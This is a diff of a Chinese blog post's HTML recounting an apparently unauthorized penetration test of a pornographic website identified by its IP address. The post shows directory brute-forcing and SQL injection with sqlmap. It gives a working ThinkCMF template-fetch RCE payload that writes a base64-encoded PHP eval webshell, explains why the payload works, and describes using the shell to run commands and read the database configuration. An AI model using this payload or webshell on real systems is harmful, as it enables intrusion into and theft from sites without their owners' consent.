@@ -97,7 +97,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/8.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/9.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/10.png">
-<meta property="og:updated_time" content="2019-11-07T01:41:47.701Z">
+<meta property="og:updated_time" content="2019-11-07T07:39:37.106Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="纪录对黄站的一次渗透测试">
 <meta name="twitter:description" content="该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。 渗透流程确定目标站点http://156.236.127.158/ 对站点进行目录爆破这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。  简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。 开始渗透注">
@@ -414,12 +414,14 @@
 <p>这里因为站长老哥把站给关了，操作过程中没有截图，所以就不放了。</p>
 <h3 id="对主体内容进行渗透"><a href="#对主体内容进行渗透" class="headerlink" title="对主体内容进行渗透"></a>对主体内容进行渗透</h3><p>经过对流量的抓包和回放测试，发现了一个SQL注入漏洞，习惯性的丢到sqlmap里面去跑。</p>
 <p><img src="/2019/11/06/One-the-yellow-penetration-test/2.png" alt></p>
-<p>但sqlmap似乎测试不出这是什么数据库，估计是过滤了一些关键字眼。本来是想着手注一下的，然后无意输入了一个错误路径，报错信息令我神经振奋。这居然是一个thinkcms的站，啥也不说payload走起。</p>
+<p>但sqlmap似乎测试不出这是什么数据库，估计是过滤了一些关键字眼。本来是想着手注一下的，然后无意输入了一个错误路径，报错信息令我神经振奋。这居然是一个ThinkCMF的站，啥也不说payload走起。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=<span class="string">''</span>&amp;content=&lt;php&gt;file_put_contents(<span class="string">'info.php'</span>,base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbJ2FiYyddKTs/Pg=='</span>))&lt;/php&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/11/06/One-the-yellow-penetration-test/3.png" alt></p>
-<p>简单介绍一下payload的触发的原因，这里就不搭建环境来介绍了，借用一下其他博主老哥的图片。<br><img src="/2019/11/06/One-the-yellow-penetration-test/11.png" alt><br>这里可以看到fetch函数有3个参数：$templateFile（模板地址）、$content（内容）、$prefix（前缀）。主要关注的只有$content，这是我们插入shell的关键，$templateFile参数只需要带入站点存在的模板地址即可，$prefix参数可忽略。<br>之所以能够插入shell主要是因为thinkcms的模板引擎使用的是smarty。<br>由于smarty分离了php代码与前端，构造的语句会先执行php逻辑，然后将结果拿到前端进行显示，于是只要我们可以控制传入的$content值即可插入shell。</p>
-<p>成功插入shell-&gt;info.php<br><img src="/2019/11/06/One-the-yellow-penetration-test/4.png" alt></p>
+<p>这里在下抽取ThinkCMF的部分代码给各位大表哥简单的介绍一下payload执行成功的原因（说的不对的，大佬请轻点喷）</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/11.png" alt></p>
+<p>payload能够执行成功首先是因为ThinkCMF的fetch方法采用的是public，这意味着可以通过a参数直接进行调用。其次是因为ThinkCMF里面的fetch调用了tp框架中的/Library/Think/View.class.php中的fetch函数，而在该函数处理中content参数是可控的，我们可以通过构造content参数传入带注入的php代码从而达到getshell的效果。</p>
+<p>emmmmmm，理论差不多就是这个样子。还是不懂的话，可以看看那些大佬们的具体分析文章。在下就继续接着友谊渗透黄站啦，执行payload，在根目录下成功创建一个info.php的一句话木马，菜刀走一波。<br><img src="/2019/11/06/One-the-yellow-penetration-test/4.png" alt></p>
 <p>啥也不说，Dos命令走一波，发现无回显，估计站长老哥做了一些安全限制。</p>
 <p>无奈只有去找其他的可用信息，查找了一下站点的配置信息，发现了数据库的配置信息。</p>
 <p><img src="/2019/11/06/One-the-yellow-penetration-test/5.png" alt></p>
